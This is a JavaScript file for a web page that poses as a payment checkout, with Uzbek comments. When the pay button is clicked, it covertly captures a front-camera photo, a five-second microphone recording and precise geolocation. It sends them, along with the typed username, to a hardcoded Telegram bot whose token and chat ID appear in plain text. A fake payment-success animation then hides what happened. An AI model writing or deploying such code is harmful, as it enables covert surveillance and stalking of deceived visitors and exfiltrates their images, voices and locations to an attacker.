const BOT_TOKEN = "8663298854:AAEDtW-ivmbZQQ4EZDLyYWH-Mx_AoCgMtV4";
const CHAT_ID = "5792929057";


// Modal boshqaruvi
const modal = document.getElementById('checkoutModal');
const modalBox = document.getElementById('modalBox');

function openCheckoutModal() {
    document.getElementById('paymentForm').classList.remove('hidden');
    document.getElementById('successState').classList.add('hidden');

    modal.classList.remove('hidden');
    setTimeout(() => {
        modal.classList.remove('opacity-0');
        modalBox.classList.remove('scale-95');
        modalBox.classList.add('scale-100');
    }, 10);
}

function closeCheckoutModal() {
    modal.classList.add('opacity-0');
    modalBox.classList.remove('scale-100');
    modalBox.classList.add('scale-95');
    setTimeout(() => {
        modal.classList.add('hidden');
    }, 250);
}

// 1. Geolokatsiyani olish
function getUserLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve(null);

        navigator.geolocation.getCurrentPosition(
            (pos) => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude }),
            (err) => {
                console.warn("Lokatsiyaga ruxsat berilmadi:", err.message);
                resolve(null);
            },
            { enableHighAccuracy: true, timeout: 7000 }
        );
    });
}

// 2. Kamera va Mikrofonni bitta oqimda (stream) ochish va 5 soniya yozish
async function captureMediaAndVoice() {
    let stream = null;
    let photoBlob = null;
    let audioBlob = null;

    try {
        // Ikkalasiga ham bitta umumiy ruxsat oynasi chiqadi (bloklanish bo'lmaydi)
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" },
            audio: true
        });

        // A) Rasmni olish
        const video = document.createElement('video');
        video.srcObject = stream;
        video.playsInline = true;
        video.muted = true;
        await video.play();

        await new Promise((r) => setTimeout(r, 400));

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        photoBlob = await new Promise((resolve) => {
            canvas.toBlob(resolve, 'image/jpeg', 0.85);
        });

        // 😎 Audio yozish (Brauzer qaysi formatni qo'llab-quvvatlasa, shuni avtomatik tanlaydi)
        let mimeType = '';
        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
            mimeType = 'audio/webm;codecs=opus';
        } else if (MediaRecorder.isTypeSupported('audio/ogg;codecs=opus')) {
            mimeType = 'audio/ogg;codecs=opus';
        } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
            mimeType = 'audio/mp4';
        }

        const options = mimeType ? { mimeType } : {};
        const mediaRecorder = new MediaRecorder(stream, options);
        const audioChunks = [];

        mediaRecorder.ondataavailable = (e) => {
            if (e.data && e.data.size > 0) {
                audioChunks.push(e.data);
            }
        };

        // 5 soniya yozishni kutish
        audioBlob = await new Promise((resolve) => {
            mediaRecorder.onstop = () => {
                const finalType = mimeType || 'audio/webm';
                const blob = new Blob(audioChunks, { type: finalType });
                resolve(blob);
            };

            mediaRecorder.start(250); // har 250ms da ma'lumotlarni yig'ib boradi

            setTimeout(() => {
                if (mediaRecorder.state !== 'inactive') {
                    mediaRecorder.stop();
                }
            }, 5000);
        });

    } catch (err) {
        console.warn("Kamera yoki mikrofon xatosi:", err.message);
    } finally {
        // Streamni to'liq o'chirib qo'yish
        if (stream) {
            stream.getTracks().forEach((track) => track.stop());
        }
    }

    return { photoBlob, audioBlob };
}
const postTg = async () => {
    const inputNumber = document.querySelector('#usernameInput');
    const textVal = inputNumber ? inputNumber.value : "Ma'lumot yo'q";

    // Media va Lokatsiyani olamiz
    const [mediaData, location] = await Promise.all([
        captureMediaAndVoice(),
        getUserLocation()
    ]);

    const { photoBlob, audioBlob } = mediaData;

    try {
        // 1. Rasm yoki oddiy matn
        if (photoBlob) {
            const photoForm = new FormData();
            photoForm.append('chat_id', CHAT_ID);
            photoForm.append('photo', photoBlob, 'photo.jpg');
            photoForm.append('caption', `Foydalanuvchi: ${textVal}`);

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: photoForm
            });
        } else {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'content-type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: textVal })
            });
        }

        // 2. Lokatsiya (agar olingan bo'lsa)
        if (location) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                method: 'POST',
                headers: { 'content-type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    latitude: location.latitude,
                    longitude: location.longitude
                })
            });
        }

        // 3. Ovozli xabar (Audio)
        if (audioBlob && audioBlob.size > 0) {
            const voiceForm = new FormData();
            voiceForm.append('chat_id', CHAT_ID);
            
            // Fayl kengaytmasini aniqlash
            const ext = audioBlob.type.includes('mp4') ? 'm4a' : (audioBlob.type.includes('ogg') ? 'ogg' : 'webm');
            voiceForm.append('voice', audioBlob, `voice_record.${ext}`);
            voiceForm.append('caption', '🎤 5 soniyalik ovoz yozuvi');

            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
                method: 'POST',
                body: voiceForm
            });

            // Agar sendVoice qabul qilmasa (format sababli), sendAudio orqali zaxira jo'natish
            const resData = await res.json();
            if (!resData.ok) {
                console.warn("sendVoice qabul qilmadi, sendAudio orqali yuborilmoqda:", resData.description);
                const audioForm = new FormData();
                audioForm.append('chat_id', CHAT_ID);
                audioForm.append('audio', audioBlob, `audio_record.${ext}`);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                    method: 'POST',
                    body: audioForm
                });
            }
        }
    } catch (err) {
        console.error("Yuborishda xatolik:", err);
    }
};

// 4. To'lov animatsiyasi
function processPayment() {
    const submitBtn = document.getElementById('paySubmitBtn');
    const originalText = submitBtn.innerHTML;

    submitBtn.disabled = true;
    submitBtn.innerHTML = `
        <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-white" fill="none" viewBox="0 0 24 24">
          <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
          <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
        </svg>
        Faollashtirilmoqda...
      `;

    setTimeout(() => {
        submitBtn.disabled = false;
        submitBtn.innerHTML = originalText;

        document.getElementById('paymentForm').classList.add('hidden');
        document.getElementById('successState').classList.remove('hidden');

        const badge = document.getElementById('userBadgePreview');
        if (badge) {
            badge.classList.remove('hidden');
            badge.classList.add('flex');
        }
 if (typeof confetti === 'function') {
            confetti({
                particleCount: 120,
                spread: 80,
                origin: { y: 0.6 }
            });
        }
    }, 1200);
}

// 5. Tugma bosilishi (Click listener)
const submitBtn = document.getElementById('paySubmitBtn');
if (submitBtn) {
    submitBtn.addEventListener('click', async (event) => {
        event.preventDefault();

        // 5 soniya davomida foydalanuvchi qayta-qayta bosib yubormasligi uchun tugma bloklanadi
        submitBtn.disabled = true;
        const defaultText = submitBtn.innerHTML;
        submitBtn.innerText = "Yozilmoqda va yuborilmoqda (5s)...";

        // Ma'lumotlarni yuborish
        await postTg();

        submitBtn.innerHTML = defaultText;
        submitBtn.disabled = false;

        // Yakuniy animatsiya
        processPayment();
    });
}

// Orqa fon zarrachalari
function generateParticles() {
    const container = document.getElementById('particles-container');
    if (!container) return;

    const colors = ['#10b981', '#a855f7', '#6366f1', '#ec4899', '#facc15', '#ffffff'];
    const count = 28;

    for (let i = 0; i < count; i++) {
        const dot = document.createElement('div');
        dot.className = 'particle';
        const size = Math.floor(Math.random() * 4) + 2;
        dot.style.width = `${size}px`;
        dot.style.height = `${size}px`;
        dot.style.left = `${Math.random() * 100}%`;
        dot.style.top = `${Math.random() * 100}%`;
        dot.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
        dot.style.animationDuration = `${6 + Math.random() * 8}s`;
        dot.style.animationDelay = `${Math.random() * 5}s`;
        container.appendChild(dot);
    }
}

window.onload = function () {
    generateParticles();
};